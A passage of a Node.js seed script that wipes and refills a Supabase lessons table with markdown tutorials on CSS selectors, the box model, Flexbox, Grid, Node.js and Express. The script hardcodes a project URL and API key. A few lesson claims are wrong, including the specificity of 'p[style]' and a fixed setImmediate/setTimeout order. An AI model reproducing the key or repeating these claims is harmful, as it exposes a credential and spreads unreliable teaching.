import dotenv from "dotenv";
dotenv.config();

const BASE = "https://rdnhbreuusnfvwmrecor.supabase.co";
const KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJkbmhicmV1dXNuZnZ3bXJlY29yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk3OTg1ODIsImV4cCI6MjA5NTM3NDU4Mn0.eVSHIHpyNUhfYOlBdoDRGTXefkRPm_YCUsmRjz4sl_o";
const H = { "apikey": KEY, "Authorization": `Bearer ${KEY}`, "Content-Type": "application/json", "Prefer": "return=minimal" };

async function insert(rows) {
  const r = await fetch(`${BASE}/rest/v1/lessons`, { method: "POST", headers: H, body: JSON.stringify(rows) });
  if (!r.ok) { const t = await r.text(); console.error("insert error:", t.slice(0, 200)); }
  else console.log(`✓ inserted ${rows.length} lessons`);
}

// Delete all lessons (fresh seed)
await fetch(`${BASE}/rest/v1/lessons?id=neq.00000000-0000-0000-0000-000000000000`, { method: "DELETE", headers: H });
console.log("Cleared lessons table");

// L(module_id, title, content, duration_minutes, order_index)
// Generates a text ID like "m201_1" automatically
const L = (m, t, c, d, i) => ({ id: `${m}_${i}`, module_id: m, title: t, content: c, duration_minutes: d, order_index: i });

// ═══════════════════════════════════════════════════════════════
// BATCH 1 — CSS3 (m201-m206)
// ═══════════════════════════════════════════════════════════════
await insert([
L("m201","Introduction to CSS",`# Introduction to CSS

## Why This Topic Matters
CSS transforms plain HTML into visually stunning interfaces. It controls every visual aspect: colors, typography, spacing, layout, and animations.

## Learning Objectives
- Understand what CSS is and how browsers apply it
- Link CSS to HTML using three methods
- Write CSS rules with selectors, properties, and values
- Understand the cascade and specificity

## Core Concepts

### Three Ways to Add CSS
\`\`\`html
<!-- 1. External (ALWAYS use this) -->
<link rel="stylesheet" href="styles.css">

<!-- 2. Internal (avoid in production) -->
<style>
  h1 { color: blue; }
</style>

<!-- 3. Inline (never use) -->
<h1 style="color: blue;">Title</h1>
\`\`\`

### CSS Rule Anatomy
\`\`\`css
selector {
  property: value;
}

h1 {
  color: #1d4ed8;
  font-size: 2rem;
  margin-bottom: 1rem;
}
\`\`\`

### The Cascade — Which Rule Wins?
\`\`\`css
p           { color: black; }  /* 0,0,1 */
.text       { color: blue; }   /* 0,1,0 */
#title      { color: red; }    /* 1,0,0 */
p[style]                       /* 1,0,0,0 — highest */
\`\`\`

## Best Practices
- Always use external CSS files for production
- Avoid inline styles and !important
- Use classes for styling, IDs for JavaScript

## Common Mistakes
- ❌ Using !important to fix specificity
- ❌ Overly long selector chains: div > ul > li > a > span

## Interview Questions
1. What does "cascading" mean in CSS?
2. How is specificity calculated?
3. What is the difference between class and ID selectors?

## Assignment
Create a product card with title, price, description, and button. Style using external CSS — different colors, fonts, and hover effects.`,20,1),

L("m201","CSS Selectors Complete Guide",`# CSS Selectors Complete Guide

## Why This Topic Matters
Selectors determine which HTML elements get styled. Mastering all selector types means you never need to add unnecessary classes or IDs to your HTML.

## Learning Objectives
- Use all CSS selector types
- Combine selectors with combinators
- Use pseudo-classes and pseudo-elements
- Use attribute selectors

## All Selector Types

### Basic
\`\`\`css
* { box-sizing: border-box; }       /* Universal */
p { margin: 0; }                    /* Element */
.card { padding: 16px; }            /* Class */
#hero { height: 100vh; }            /* ID */
\`\`\`

### Combinators
\`\`\`css
div p    { }   /* Descendant — any nested p */
div > p  { }   /* Child — direct child only */
h1 + p   { }   /* Adjacent sibling */
h1 ~ p   { }   /* All siblings after h1 */
\`\`\`

### Pseudo-Classes
\`\`\`css
a:hover          { color: blue; }
button:focus     { outline: 2px solid blue; }
li:first-child   { font-weight: bold; }
li:last-child    { border: none; }
li:nth-child(2n) { background: #f0f4f8; }  /* Even */
li:nth-child(odd){ background: white; }
input:checked    { accent-color: blue; }
input:disabled   { opacity: 0.5; }
:not(.active)    { opacity: 0.7; }
\`\`\`

### Pseudo-Elements
\`\`\`css
p::first-line   { font-weight: bold; }
p::first-letter { font-size: 2em; float: left; }
.tooltip::before {
  content: "ℹ️ ";
}
.divider::after {
  content: "";
  display: block;
  border-bottom: 1px solid #e5e7eb;
  margin-top: 16px;
}
\`\`\`

### Attribute Selectors
\`\`\`css
input[type="email"]   { border-color: blue; }
a[href^="https"]      { color: green; }   /* starts with */
a[href$=".pdf"]       { color: red; }     /* ends with */
[data-theme="dark"]   { background: #111; }
\`\`\`

## Best Practices
- Keep selectors short (max 3 levels deep)
- Prefer .class over element or #id
- Always add :focus styles for accessibility

## Interview Questions
1. What is the difference between div p and div > p?
2. What does :nth-child(2n+1) select?
3. What is a pseudo-element vs pseudo-class?

## Assignment
Build a data table: style alternating rows with nth-child, first/last column differently with attribute selectors, add hover highlight, and style the sort indicator with ::after.`,25,2),

L("m201","The Box Model",`# The Box Model

## Why This Topic Matters
Every element on a web page is a rectangular box. The box model defines how size and spacing work. Misunderstanding it causes the most common CSS layout bugs.

## Learning Objectives
- Explain the four layers of the box model
- Use padding, border, and margin correctly
- Understand box-sizing: border-box
- Calculate element dimensions

## Core Concepts

### Box Model Layers (inside to outside)
\`\`\`
┌──────────────────────────────────┐
│           MARGIN                 │  ← Outside spacing (transparent)
│  ┌────────────────────────────┐  │
│  │         BORDER             │  │  ← Visible border
│  │  ┌──────────────────────┐  │  │
│  │  │       PADDING        │  │  │  ← Inside spacing
│  │  │  ┌────────────────┐  │  │  │
│  │  │  │    CONTENT     │  │  │  │  ← width × height
│  │  │  └────────────────┘  │  │  │
│  │  └──────────────────────┘  │  │
│  └────────────────────────────┘  │
└──────────────────────────────────┘
\`\`\`

### box-sizing: border-box (USE ALWAYS)
\`\`\`css
/* Without border-box (default — confusing) */
.box {
  width: 200px;
  padding: 20px;
  border: 2px solid black;
  /* ACTUAL width = 200 + 40 + 4 = 244px! */
}

/* With border-box (intuitive) */
.box {
  box-sizing: border-box;
  width: 200px;
  padding: 20px;
  border: 2px solid black;
  /* ACTUAL width = 200px (padding/border included) */
}

/* Apply globally (do this in every project) */
*, *::before, *::after {
  box-sizing: border-box;
}
\`\`\`

### Margin vs Padding
\`\`\`css
/* Padding — space INSIDE (affects background color area) */
.card {
  padding: 24px;        /* All sides */
  padding: 16px 24px;   /* Vertical | Horizontal */
  padding: 8px 16px 24px 32px; /* Top Right Bottom Left */
}

/* Margin — space OUTSIDE (doesn't affect background) */
.card {
  margin: 24px auto;    /* Vertical | Auto horizontal = center */
  margin-top: 16px;
}
\`\`\`

### Margin Collapse
\`\`\`css
/* Vertical margins collapse — larger one wins */
.section { margin-bottom: 40px; }
.section + .section { margin-top: 20px; }
/* Gap between sections = 40px, NOT 60px */
\`\`\`

## Best Practices
- Always set box-sizing: border-box globally
- Use padding for inner spacing, margin for outer spacing
- Use margin: auto for centering block elements

## Common Mistakes
- ❌ Not setting box-sizing: border-box (elements bigger than expected)
- ❌ Using margin where padding should be used
- ❌ Not understanding margin collapse

## Interview Questions
1. What are the four parts of the CSS box model?
2. What is the difference between margin and padding?
3. What is margin collapse?
4. Why should you use box-sizing: border-box?

## Assignment
Build a pricing card with: icon area, title, price, feature list, and CTA button. Use the box model deliberately — padding for internal spacing, margin for external, and border for visual separation. Inspect it in DevTools.`,25,3),
]);

// ═══════════════════════════════════════════════════════════════
// BATCH 2 — CSS Flexbox & Grid
// ═══════════════════════════════════════════════════════════════
await insert([
L("m205","Flexbox Complete Guide",`# Flexbox Complete Guide

## Why This Topic Matters
Flexbox revolutionized CSS layouts. It makes centering trivial and handles complex alignment with minimal code. Used in virtually every modern web UI.

## Learning Objectives
- Create flex containers and understand flex items
- Control direction, wrapping, and alignment
- Use justify-content, align-items, align-self
- Build real layouts with flexbox

## Core Concepts

### Container vs Items
\`\`\`css
.container {
  display: flex;  /* Makes this a flex container */
  /* All direct children become flex items */
}
\`\`\`

### Main Axis vs Cross Axis
\`\`\`
flex-direction: row (default)
  Main axis → → → → (horizontal)
  Cross axis ↓ ↓ ↓ ↓ (vertical)

flex-direction: column
  Main axis ↓ (vertical)
  Cross axis → (horizontal)
\`\`\`

### Container Properties
\`\`\`css
.container {
  display: flex;
  flex-direction: row | column | row-reverse | column-reverse;
  flex-wrap: nowrap | wrap | wrap-reverse;
  justify-content: flex-start | flex-end | center | space-between | space-around | space-evenly;
  align-items: stretch | flex-start | flex-end | center | baseline;
  align-content: flex-start | center | space-between; /* multi-line */
  gap: 16px;          /* Space between items */
  gap: 16px 24px;     /* Row gap | Column gap */
}
\`\`\`

### Item Properties
\`\`\`css
.item {
  flex: 1;          /* grow: 1, shrink: 1, basis: 0 */
  flex: 0 0 200px;  /* Don't grow, don't shrink, 200px wide */
  align-self: flex-end; /* Override container alignment */
  order: 2;         /* Change visual order without HTML change */
}
\`\`\`

### Common Patterns
\`\`\`css
/* Center anything */
.center { display: flex; justify-content: center; align-items: center; }

/* Sticky footer */
body { display: flex; flex-direction: column; min-height: 100vh; }
main { flex: 1; }

/* Nav: logo left, links right */
nav { display: flex; justify-content: space-between; align-items: center; }

/* Equal columns */
.cols { display: flex; gap: 16px; }
.col  { flex: 1; }

/* Sidebar + main */
.layout { display: flex; }
.sidebar { width: 260px; flex-shrink: 0; }
.main    { flex: 1; min-width: 0; } /* min-width: 0 prevents overflow */
\`\`\`

## Best Practices
- Use gap instead of margin for spacing between items
- Use flex: 1 for equal-width items
- Add min-width: 0 to flex items that contain text (prevents overflow)

## Common Mistakes
- ❌ Applying flex properties (justify-content) to flex ITEMS
- ❌ Using margins instead of gap
- ❌ Forgetting flex-direction changes which axis is "main"

## Interview Questions
1. What is the difference between justify-content and align-items?
2. What does flex: 1 mean?
3. What is the difference between align-items and align-self?

## Assignment
Build a dashboard layout: sticky sidebar (fixed width), main content area (fills remaining space), top navbar (logo + nav + user avatar), and a responsive card grid inside main. Flexbox only.`,30,1),

L("m206","CSS Grid Complete Guide",`# CSS Grid Complete Guide

## Why This Topic Matters
CSS Grid is the most powerful layout system in CSS — the first one designed specifically for two-dimensional layouts. It handles both rows and columns simultaneously.

## Learning Objectives
- Create grid containers and define tracks
- Place items precisely in the grid
- Use template areas for readable layouts
- Create responsive grids without media queries

## Core Concepts

### Creating a Grid
\`\`\`css
.container {
  display: grid;
  grid-template-columns: 200px 1fr 200px;  /* 3 columns */
  grid-template-rows: 60px 1fr 60px;        /* 3 rows */
  gap: 16px;
  height: 100vh;
}
\`\`\`

### The fr Unit & Functions
\`\`\`css
/* fr = fraction of available space */
grid-template-columns: 1fr 2fr 1fr;
/* = 25%  50%  25% */

/* repeat() */
grid-template-columns: repeat(3, 1fr);      /* 3 equal columns */
grid-template-columns: repeat(4, minmax(200px, 1fr)); /* 4 responsive cols */

/* auto-fit: fill row, expand to fill space */
grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
/* Creates as many 250px+ columns as fit — fully responsive! */
\`\`\`

### Placing Items
\`\`\`css
.item {
  grid-column: 1 / 3;     /* From line 1 to line 3 (spans 2) */
  grid-row: 1 / 2;        /* Row 1 */
  grid-column: span 2;    /* Span 2 columns from where it is */
}
\`\`\`

### Named Template Areas (Most readable)
\`\`\`css
.page {
  display: grid;
  grid-template-areas:
    "header header  header"
    "sidebar main   main"
    "sidebar main   main"
    "footer  footer footer";
  grid-template-columns: 250px 1fr 1fr;
  grid-template-rows: 60px 1fr 1fr 60px;
  gap: 16px;
  height: 100vh;
}

.header  { grid-area: header; }
.sidebar { grid-area: sidebar; }
.main    { grid-area: main; }
.footer  { grid-area: footer; }
\`\`\`

### Responsive Without Media Queries
\`\`\`css
.cards {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
  gap: 24px;
}
/* Cards automatically wrap when viewport shrinks */
\`\`\`

## Grid vs Flexbox
| Use Case | Tool |
|---|---|
| Navigation bar (1D) | Flexbox |
| Card row (1D) | Flexbox |
| Page layout (2D) | Grid |
| Complex dashboard | Grid |
| Centering one item | Either |

## Best Practices
- Use Grid for 2D, Flexbox for 1D
- Use template areas for complex layouts (very readable)
- Use auto-fit + minmax for responsive grids

## Common Mistakes
- ❌ Grid for simple one-row layouts (Flexbox is simpler)
- ❌ Hardcoded columns (use fr units)
- ❌ Forgetting grid lines start at 1

## Interview Questions
1. What is the difference between CSS Grid and Flexbox?
2. What does fr mean?
3. What is auto-fit vs auto-fill?
4. What are grid template areas?

## Assignment
Build a magazine layout: full-width header, 3-column article grid where article 1 spans 2 columns, right sidebar for recent posts, and full-width footer. Use named grid areas.`,30,1),
]);

// ═══════════════════════════════════════════════════════════════
// BATCH 3 — Node.js (m701-m706)
// ═══════════════════════════════════════════════════════════════
await insert([
L("m701","What is Node.js?",`# What is Node.js?

## Why This Topic Matters
Node.js lets you run JavaScript on the server. It powers backends for Netflix, LinkedIn, Uber, and thousands of startups. Understanding its architecture explains why it's so fast.

## Learning Objectives
- Understand what Node.js is and its architecture
- Know the difference between Node and browsers
- Install Node.js and run your first script
- Use global objects and process

## Core Concepts

### Architecture
\`\`\`
Your JS Code
     ↓
  V8 Engine (compiles JS → machine code)
     ↓
  libuv (handles async I/O, event loop, thread pool)
     ↓
  OS (file system, network, timers)
\`\`\`

### Node vs Browser
| Feature | Browser | Node.js |
|---|---|---|
| DOM / window | ✅ | ❌ |
| File system | ❌ | ✅ |
| HTTP server | ❌ | ✅ |
| process / os | ❌ | ✅ |
| Modules | limited | ✅ CommonJS + ESM |

### First Script
\`\`\`javascript
// app.js
console.log('Node.js version:', process.version);
console.log('Platform:', process.platform);
console.log('Current dir:', __dirname);
console.log('Args:', process.argv.slice(2));
\`\`\`
\`\`\`bash
node app.js
node app.js --name Alice
\`\`\`

### Global Objects
\`\`\`javascript
__dirname          // Absolute path of current directory
__filename         // Absolute path of current file
process.env.PORT   // Environment variables
process.argv       // Command-line arguments
process.exit(0)    // Exit (0 = success, 1 = error)
process.cwd()      // Current working directory
\`\`\`

## Best Practices
- Always use LTS Node.js version in production
- Never hardcode config — use process.env
- Use process.exit(1) when an error requires exit

## Interview Questions
1. What is libuv and why does Node need it?
2. How is Node different from a browser environment?
3. What is the V8 engine?

## Assignment
Write a CLI script that accepts --name and --greeting flags and prints a personalized greeting. Show Node version, current time, and platform.`,20,1),

L("m702","Node Modules & NPM",`# Node Modules & NPM

## Why This Topic Matters
Every Node.js application is built from modules. NPM gives you access to 2 million+ packages. Understanding both is fundamental to building anything real.

## Learning Objectives
- Use CommonJS and ES Modules
- Create and export your own modules
- Install, manage, and update npm packages
- Understand package.json and package-lock.json

## Core Concepts

### CommonJS (CJS)
\`\`\`javascript
// math.js — exporting
function add(a, b) { return a + b; }
const PI = 3.14159;
module.exports = { add, PI };

// main.js — importing
const { add, PI } = require('./math');
const express = require('express'); // npm package
\`\`\`

### ES Modules (ESM) — Modern
\`\`\`javascript
// math.mjs or with "type":"module" in package.json
export function add(a, b) { return a + b; }
export const PI = 3.14159;
export default class Calculator { ... }

// main.mjs
import { add, PI } from './math.mjs';
import Calculator from './math.mjs';
import express from 'express';
\`\`\`

### NPM Commands
\`\`\`bash
npm init -y                     # Create package.json
npm install express             # Install + add to dependencies
npm install -D jest             # Dev dependency
npm install -g nodemon          # Global install
npm uninstall express           # Remove
npm update                      # Update all packages
npm list                        # List installed packages
npm outdated                    # Show outdated packages
npm audit                       # Check for vulnerabilities
npm audit fix                   # Auto-fix vulnerabilities
npm run start                   # Run "start" script
\`\`\`

### package.json Key Fields
\`\`\`json
{
  "name": "my-api",
  "version": "1.0.0",
  "main": "index.js",
  "type": "module",
  "scripts": {
    "start": "node index.js",
    "dev": "nodemon index.js",
    "test": "jest"
  },
  "dependencies": {
    "express": "^4.18.0"
  },
  "devDependencies": {
    "nodemon": "^3.0.0",
    "jest": "^29.0.0"
  }
}
\`\`\`

### Version Ranges
\`\`\`
"^4.18.0"  → 4.x.x (compatible with 4.18.0)
"~4.18.0"  → 4.18.x (patch updates only)
"4.18.0"   → Exact version
"*"        → Any version (dangerous)
\`\`\`

## Best Practices
- Always commit package.json AND package-lock.json
- Never commit node_modules/
- Use exact versions for critical dependencies in production
- Run npm audit regularly

## Common Mistakes
- ❌ Committing node_modules (500MB+)
- ❌ Installing packages globally when local would do
- ❌ Not using package-lock.json (non-deterministic installs)

## Interview Questions
1. What is the difference between dependencies and devDependencies?
2. What does the ^ mean in version numbers?
3. What is package-lock.json and why is it important?

## Assignment
Create a Node.js utility library: export 5 utility functions (formatDate, capitalize, slugify, truncate, randomId) as a module. Write a main.js that imports and tests them. Add a package.json with scripts.`,25,2),

L("m703","The Node.js Event Loop",`# The Node.js Event Loop

## Why This Topic Matters
The Event Loop is THE core concept of Node.js. It explains how a single-threaded language handles thousands of concurrent connections. Every async bug traces back to understanding (or misunderstanding) this.

## Learning Objectives
- Understand how Node handles async operations
- Know event loop phases
- Explain call stack, callback queue, microtask queue
- Avoid common async execution order bugs

## Core Concepts

### Single Thread + Async I/O
\`\`\`
Traditional servers:   1 request = 1 thread (blocked waiting)
                       1000 requests = 1000 threads!

Node.js:              1 thread, non-blocking I/O
                      While waiting for DB → handle other requests
                      1 thread handles 10,000+ concurrent requests
\`\`\`

### Event Loop Phases
\`\`\`
   ┌─────────────────────┐
┌→ │  1. timers          │  setTimeout, setInterval callbacks
│  ├─────────────────────┤
│  │  2. pending I/O     │  system errors
│  ├─────────────────────┤
│  │  3. idle/prepare    │  internal
│  ├─────────────────────┤
│  │  4. poll            │  ← WAITS HERE for I/O (fs, http)
│  ├─────────────────────┤
│  │  5. check           │  setImmediate callbacks
│  ├─────────────────────┤
└──┤  6. close callbacks │  socket.on('close')
   └─────────────────────┘
   ↑ After each phase: drain microtask queue (Promises, nextTick)
\`\`\`

### Execution Priority Order
\`\`\`javascript
console.log('1. Synchronous');

setTimeout(() => console.log('5. setTimeout'), 0);

setImmediate(() => console.log('4. setImmediate'));

Promise.resolve().then(() => console.log('3. Promise (microtask)'));

process.nextTick(() => console.log('2. nextTick (microtask)'));

console.log('1. Synchronous end');

// Output: 1, 1, 2, 3, 4, 5
// Sync first → nextTick → Promises → setImmediate → setTimeout
\`\`\`

### Never Block the Event Loop
\`\`\`javascript
// ❌ BLOCKING — blocks ALL other requests!
app.get('/users', (req, res) => {
  const data = fs.readFileSync('/huge/file.json'); // BLOCKS!
  res.json(JSON.parse(data));
});

// ✅ NON-BLOCKING
app.get('/users', async (req, res) => {
  const data = await fs.promises.readFile('/huge/file.json');
  res.json(JSON.parse(data));
});

// ❌ CPU-intensive in request handler
app.get('/calc', (req, res) => {
  const result = slowCalculation(1_000_000); // Blocks loop!
  res.json({ result });
});

// ✅ Offload to Worker Thread
const { Worker } = require('worker_threads');
\`\`\`

## Best Practices
- Never use sync methods (readFileSync, writeFileSync) in servers
- Use worker_threads for CPU-intensive work
- Use process.nextTick sparingly (can starve I/O)

## Common Mistakes
- ❌ JSON.parse of huge strings in request handlers
- ❌ Sync file operations anywhere in the request path
- ❌ Infinite loops in middleware

## Interview Questions
1. How does Node handle 10,000 concurrent connections with one thread?
2. What is the difference between process.nextTick and setImmediate?
3. What does "blocking the event loop" mean and why is it bad?
4. In what order do these execute: setTimeout, Promise.resolve, nextTick?

## Assignment
Demonstrate event loop understanding: write a script that measures how long different async operations take. Show the execution order with console.log + timestamps. Include: sync code, nextTick, Promise, setTimeout, setImmediate, and a file read.`,35,1),

L("m704","File System Module",`# File System Module

## Why This Topic Matters
Working with files is a core server task — reading configs, writing logs, processing uploads, generating reports. Node's fs module is your primary tool.

## Learning Objectives
- Read and write files asynchronously
- Work with directories
- Use the fs/promises API with async/await
- Handle file errors properly

## Core Concepts

### fs/promises (Modern — Always Use)
\`\`\`javascript
const fs = require('fs/promises');
// Or ESM:
import { readFile, writeFile, mkdir, readdir, stat, unlink } from 'fs/promises';
\`\`\`

### Reading Files
\`\`\`javascript
// Read text file
const content = await fs.readFile('./config.json', 'utf-8');
const config = JSON.parse(content);

// Read binary file
const image = await fs.readFile('./photo.jpg'); // Buffer
\`\`\`

### Writing Files
\`\`\`javascript
// Write (creates or overwrites)
await fs.writeFile('./output.txt', 'Hello World', 'utf-8');

// Append
await fs.appendFile('./app.log', \`[\${new Date().toISOString()}] Log entry\n\`);

// Write JSON
await fs.writeFile('./data.json', JSON.stringify(data, null, 2));
\`\`\`

### Directories
\`\`\`javascript
// Create directory
await fs.mkdir('./uploads', { recursive: true }); // recursive = don't fail if exists

// List directory
const files = await fs.readdir('./src');
console.log(files); // ['index.js', 'utils.js', ...]

// Check if file exists
try {
  await fs.access('./config.json');
  console.log('File exists');
} catch {
  console.log('File not found');
}

// File stats
const stats = await fs.stat('./app.js');
console.log(stats.size, stats.mtime, stats.isDirectory());
\`\`\`

### Practical: Config Loader
\`\`\`javascript
async function loadConfig(path) {
  try {
    const raw = await fs.readFile(path, 'utf-8');
    return JSON.parse(raw);
  } catch (err) {
    if (err.code === 'ENOENT') {
      throw new Error(\`Config file not found: \${path}\`);
    }
    if (err instanceof SyntaxError) {
      throw new Error(\`Invalid JSON in config: \${path}\`);
    }
    throw err;
  }
}
\`\`\`

### Common Error Codes
| Code | Meaning |
|---|---|
| ENOENT | File/directory not found |
| EACCES | Permission denied |
| EEXIST | File already exists |
| EISDIR | Expected file, got directory |

## Best Practices
- Always use fs/promises with async/await
- Handle ENOENT errors explicitly
- Use path.join() for file paths (cross-platform)
- Use { recursive: true } with mkdir

## Common Mistakes
- ❌ Using fs.readFileSync in Express routes
- ❌ String concatenation for paths: './dir/' + filename (use path.join)
- ❌ Not handling ENOENT errors

## Interview Questions
1. What is the difference between fs.readFile and fs.readFileSync?
2. How do you check if a file exists in Node.js?
3. What does { recursive: true } do in fs.mkdir?

## Assignment
Build a simple JSON database: functions to create(id, data), read(id), update(id, patch), delete(id), and list(). Each record stored as a separate JSON file in a ./data/ directory. Handle all error cases.`,25,1),

L("m706","Building an HTTP Server",`# Building an HTTP Server

## Why This Topic Matters
Understanding how to build an HTTP server from scratch gives you insight into what Express does under the hood. You'll debug server issues much faster knowing the fundamentals.

## Learning Objectives
- Create HTTP servers with Node's http module
- Parse URLs, routes, and request bodies
- Set response headers and status codes
- Understand why Express is needed

## Core Concepts

### Basic HTTP Server
\`\`\`javascript
const http = require('http');

const server = http.createServer((req, res) => {
  // req = IncomingMessage
  // res = ServerResponse

  console.log(req.method, req.url);

  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ message: 'Hello World' }));
});

server.listen(3000, () => {
  console.log('Server running on http://localhost:3000');
});
\`\`\`

### Routing (Manual)
\`\`\`javascript
const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, \`http://\${req.headers.host}\`);
  const path = url.pathname;
  const method = req.method;

  // Route: GET /
  if (method === 'GET' && path === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<h1>Home</h1>');
  }
  // Route: GET /api/users
  else if (method === 'GET' && path === '/api/users') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify([{ id: 1, name: 'Alice' }]));
  }
  // 404
  else {
    res.writeHead(404, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: 'Not found' }));
  }
});
\`\`\`

### Parsing Request Body
\`\`\`javascript
function getBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try { resolve(JSON.parse(body)); }
      catch { reject(new Error('Invalid JSON')); }
    });
    req.on('error', reject);
  });
}

// Usage in server handler:
if (method === 'POST' && path === '/api/users') {
  const body = await getBody(req);
  // body = { name: 'Bob', email: 'bob@example.com' }
}
\`\`\`

### Why We Use Express
\`\`\`javascript
// Without Express: manual routing, parsing, error handling
// 100+ lines for basic CRUD

// With Express: 20 lines for the same CRUD
// Express provides: routing, middleware, body parsing, error handling
\`\`\`

## Best Practices
- Always set Content-Type header
- Return appropriate HTTP status codes
- Handle POST body parsing errors

## Interview Questions
1. What is the difference between req and res in HTTP?
2. How do you parse a JSON request body in plain Node.js?
3. Why do we need frameworks like Express over plain http module?

## Assignment
Build a REST API using ONLY Node's http module (no Express): GET /api/todos (list), POST /api/todos (create), DELETE /api/todos/:id. Use an in-memory array for storage. Then compare the complexity to the Express equivalent.`,30,1),
]);

// ═══════════════════════════════════════════════════════════════
// BATCH 4 — Express.js (m801-m803)
// ═══════════════════════════════════════════════════════════════
await insert([
L("m801","Express.js Introduction",`# Express.js Introduction

## Why This Topic Matters
Express is the most popular Node.js framework. It turns 100 lines of manual HTTP code into 10 lines. Used in millions of production applications.

## Learning Objectives
- Install and configure Express
- Create routes and handle requests
- Send various response types
- Use the request and response objects

## Core Concepts

### Hello World
\`\`\`bash
npm init -y && npm install express
\`\`\`
\`\`\`javascript
const express = require('express');
const app = express();

app.use(express.json());  // Parse JSON request bodies

app.get('/', (req, res) => {
  res.json({ message: 'Hello World!' });
});

app.listen(process.env.PORT || 3000, () => {
  console.log('Server running on port 3000');
});
\`\`\`

### Request Object
\`\`\`javascript
app.get('/users/:id', (req, res) => {
  req.params.id        // Route param: /users/123 → "123"
  req.query.page       // Query param: ?page=2 → "2"
  req.body             // JSON body (POST/PUT/PATCH)
  req.headers          // All HTTP headers
  req.method           // "GET"
  req.path             // "/users/123"
  req.ip               // Client IP
  req.get('Authorization') // Get specific header
});
\`\`\`

### Response Methods
\`\`\`javascript
res.json({ user: 'Alice' })              // JSON response
res.status(201).json({ created: true })  // With status code
res.status(404).json({ error: 'Not found' })
res.send('Plain text')
res.redirect(301, '/new-path')
res.sendFile('/absolute/path/to/file.html')
res.download('/path/to/file.pdf')
res.set('X-Custom-Header', 'value')      // Set header
\`\`\`

### Full REST API Skeleton
\`\`\`javascript
const express = require('express');
const app = express();
app.use(express.json());

let users = [{ id: 1, name: 'Alice' }];

app.get('/api/users', (req, res) => {
  res.json(users);
});

app.get('/api/users/:id', (req, res) => {
  const user = users.find(u => u.id === parseInt(req.params.id));
  if (!user) return res.status(404).json({ error: 'User not found' });
  res.json(user);
});

app.post('/api/users', (req, res) => {
  const user = { id: users.length + 1, ...req.body };
  users.push(user);
  res.status(201).json(user);
});

app.put('/api/users/:id', (req, res) => {
  const idx = users.findIndex(u => u.id === parseInt(req.params.id));
  if (idx === -1) return res.status(404).json({ error: 'Not found' });
  users[idx] = { ...users[idx], ...req.body };
  res.json(users[idx]);
});

app.delete('/api/users/:id', (req, res) => {
  users = users.filter(u => u.id !== parseInt(req.params.id));
  res.status(204).send();
});

app.listen(3000);
\`\`\`

## Best Practices
- Always use express.json() middleware
- Return proper HTTP status codes
- Use process.env.PORT || 3000

## Common Mistakes
- ❌ Forgetting express.json() (body is undefined)
- ❌ Not sending a response (request hangs forever)
- ❌ Sending response twice (crashes process)

## Interview Questions
1. What is middleware in Express?
2. What is the difference between req.params and req.query?
3. What does express.json() do?

## Assignment
Build a bookstore API: books with id, title, author, genre, price. Implement all 5 CRUD operations with proper status codes. Add query filtering: GET /books?genre=fiction&maxPrice=20`,25,1),

L("m803","Express Middleware",`# Express Middleware

## Why This Topic Matters
Middleware is what makes Express powerful. Authentication, logging, validation, error handling — all implemented as middleware. Understanding it unlocks the full Express ecosystem.

## Learning Objectives
- Understand what middleware is and how it works
- Create custom middleware
- Use third-party middleware
- Build auth and error-handling middleware

## Core Concepts

### What is Middleware?
\`\`\`javascript
// Middleware = function with (req, res, next)
// next() passes control to the next middleware

function myMiddleware(req, res, next) {
  // 1. Execute code
  console.log('Request received:', req.method, req.path);

  // 2. Modify req/res
  req.requestTime = Date.now();

  // 3. Call next() to continue OR end response
  next(); // Continue to next middleware/route
  // res.status(401).json({error: 'Unauthorized'}); // Stop here
}

app.use(myMiddleware); // Apply to ALL routes
\`\`\`

### Middleware Chain
\`\`\`
Request → middleware1 → middleware2 → route handler → Response
               ↓ next()       ↓ next()
          (or responds)  (or responds)
\`\`\`

### Logger Middleware
\`\`\`javascript
function logger(req, res, next) {
  const start = Date.now();

  res.on('finish', () => {
    const duration = Date.now() - start;
    console.log(\`\${req.method} \${req.path} \${res.statusCode} \${duration}ms\`);
  });

  next();
}

app.use(logger);
\`\`\`

### Authentication Middleware
\`\`\`javascript
function authenticate(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];

  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }

  try {
    const payload = jwt.verify(token, process.env.JWT_SECRET);
    req.user = payload;
    next();
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
}

// Apply to specific routes
app.get('/api/profile', authenticate, (req, res) => {
  res.json(req.user);
});

// Apply to all /api/admin routes
app.use('/api/admin', authenticate, adminRouter);
\`\`\`

### Error-Handling Middleware (4 params)
\`\`\`javascript
// Must have exactly 4 parameters: (err, req, res, next)
app.use((err, req, res, next) => {
  console.error(err.stack);

  const status = err.status || 500;
  const message = err.message || 'Internal Server Error';

  res.status(status).json({
    error: {
      message,
      ...(process.env.NODE_ENV === 'development' && { stack: err.stack })
    }
  });
});

// Trigger it with next(err)
app.get('/api/user', async (req, res, next) => {
  try {
    const user = await db.getUser(req.params.id);
    res.json(user);
  } catch (err) {
    next(err); // Pass error to error handler
  }
});
\`\`\`

### Popular Third-Party Middleware
\`\`\`javascript
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const morgan = require('morgan');

app.use(cors({ origin: 'https://myapp.com' }));
app.use(helmet()); // Sets security headers
app.use(morgan('dev')); // Logs requests
app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 100 })); // 100 req/15min
\`\`\`

## Best Practices
- Order matters: place logger first, auth before protected routes, error handler last
- Always call next() or send a response (never both)
- Use next(err) for async errors

## Common Mistakes
- ❌ Calling both next() AND res.json() (double response)
- ❌ Forgetting 4th parameter in error middleware
- ❌ Not catching async errors with try/catch → next(err)

## Interview Questions
